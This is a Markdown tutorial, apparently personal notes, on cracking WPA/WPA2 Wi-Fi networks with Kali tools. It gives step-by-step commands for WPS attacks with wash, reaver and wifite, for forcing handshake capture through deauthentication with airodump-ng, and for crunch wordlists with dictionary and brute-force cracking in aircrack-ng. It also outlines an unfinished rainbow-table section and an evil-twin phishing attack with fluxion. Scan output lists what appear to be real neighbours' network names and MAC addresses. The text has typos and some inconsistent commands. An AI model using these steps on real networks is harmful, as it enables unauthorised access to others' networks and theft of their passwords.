# Play With WPA / WPA2 Encryption


### WPA/WPA2:
- WPA/WPA2 (Wi-Fi Procted Access) is the latest generation of network encryption.
- It's desgined to secure wireless computer network.
- WPA/WPA2 are similar but the only different is WPA2 uses CCMP algorithm.
- It's the most widely used encryption to secure the networks.
- It's using a unique temporary key and using 256 bits.

First we have to check is which network have WPA and enable on it. We gonna use tool called **wash**.

Open a terminal and type: `wash`

You will see the all option.

`wash -i wlan0mon -F`

```
wahs		-> tool
-i			-> interface
wlan0mon	-> network card name
-F			--ignore-fcs (Ignore frame checksum errors)
```
Select your target.

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
50:64:2B:47:F0:53    1  -75  2.0  No   RalinkTe  Arnob Amit
0C:80:63:78:0F:0A    1  -91  2.0  No   RalinkTe  jarif
D4:6E:0E:77:03:1E    1  -86  2.0  No   RalinkTe  AHAD JOY
14:CC:20:B2:B3:E2    1  -88  1.0  No   AtherosC  WiFi
C4:6E:1F:0B:A2:E0    1  -61  1.0  No   AtherosC  shad wi-fi
```
Now We gonna use tool called **reaver**.

`reaver -i wlan0mon -b 50:64:2B:C7:3E:30 -c 6 -vv 1`

```
reaver				-> tool
-i					-> interface
wlan0mon			-> network card on monitor mode
XX:XX:XX:XX:XX:XX	-> target network mac address
-c					-> channel
-vv					-> display non chractor error
-K					-> pixie-dust
```
This method is not working good. Now we use **wifite** tool. Just use the command then network scan will be automatically.

`wifite`

```
NUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT
   ---  -------------------------  ---  ----  -----  ----  ------
     1                      L1F2     1   WPA   51db   yes                                             
     2                      LiFi     6   WPA   48db    no                                             
     3                shad wi-fi     1   WPA   40db   yes                                             
     4                        SK     3   WPA   35db   yes    1                                        
     5                     maruf    11   WPA   35db    no
```

Then press *ctrl+c* and type your target channel. Example:

`[+] select target(s) (1-40) separated by commas, dashes or all: 1`

This method is not working maximux time. Now we use another method.

## Capture The Handshake File

We can only capture handshake file when a client connect to the network.

**Steps:**
- We will disconnect the client using deauthentication attack.
- Then we will let him connect again by stoping the attack.
- After that will be able to capture the handshake. 


`airmon-ng start wlan0`		-> change monitor mood.

`airodump-ng wlan0mon`		-> scan the network

Scan the target network.
`airodump-ng -c 5 --bssid XX:XX:XX:XX:XX:XX --write HandShak wlan0mon`

New *.cap* file is created.

## Creating a wordlist.

Crunch can generate all possible combinations and permutations.

**Crunch Useful Commands:**

- (MIN) The minimum number of characters
- (MAX) The maximun number of character
- T(PATTERN) You can use it if you know the first or the last *character* of the password
- O(OUTPUT) where do you want to output the wordlist

`CRUNCH (MIN)(MAX) {CHARACTERS:NUMBERS|SYMBOLES|CAPITAL OR SMALL LETTER} -T (PATTERN) -O (OUTPUT)`

Example create word list.

`crunch 5 8 123456abcdefg -o /root/Documents/wordlist.list`

or you can min and max is same number.

`crunch 8 8 123456abcdefg -o /root/Documents/wordlist.list`

`crunch 5 5 123456abcdefg -t a@@@b -o /root/Documents/wordlist.list`


## Dictionary Attack

Guessing the password of the access point by using a wordlist contants a large number of passwords.

**THEORY**
- Aircrack-ng tool will combine the passwords with the access point name.
- Create a pairwish master key or (PMK) using PBKDF2 algorithm
- This PMK is going to compared to the **HANDSHAK**

Target you network as like befoure and then dictionary attack using aircrack-ng tool.

`aircrack-ng dictionary-01.cap -w '/root/Documents/wordlist.list`

If the password is in your wordlist then you get it.


## Creacking WPA/WPA2 Using BRETEFORCE Attack

The problems that we could face with dictionary attack is there is not enough space on our HARD DRIVE nad tacking time to generate a big wordlist.

**BruteForce Attack:**

- Capture the HANDSHAKE.
- Use AIRCRACK-NG and CRUNCH at the same time.
- Use CRUNCH to specify the charactures.

Chanve manage mode to monitor mode.
`airmon-ng start wlan0`

Scaning network for target.
`airodump-ng wlan0mon`

Target network scaning.
`airodump-ng -c 5 --bssid XX:XX:XX:XX:XX:XX --write bruteforce wlan0mon`


## Cracking WPA/WPA2 Using RAINBOW TABLE Attack

Rainbow table attack is much quicker then dictionary and bruteforce attack. Rainbow table attack converting all the PASSWORD to PMK.

**STEPS**

- Creaate a databse using Alrolib-ng.
- Import the essid and the wordlist to the database.
- Combing the essid with the wordlist.
- Convert the password to pmk.

**NOT COMPLETE**


## Cracking WPA/WPA2 Using Evil Twin Attack

- Create a new access point has the same information of the target network.
- Jam the target network.
- Tthe client will forced to connect to our (AP)
- A security recommendation page will pop up and ask him for the password.

We will use **fluxion** tool. It has not default install kali linux. So first we have to clone or download in github.

`https://github.com/FluxionNetwork/fluxion`

Go to **fluxion** directory first and install it.

`root@kali:~/fluxion# ./Installer.sh`
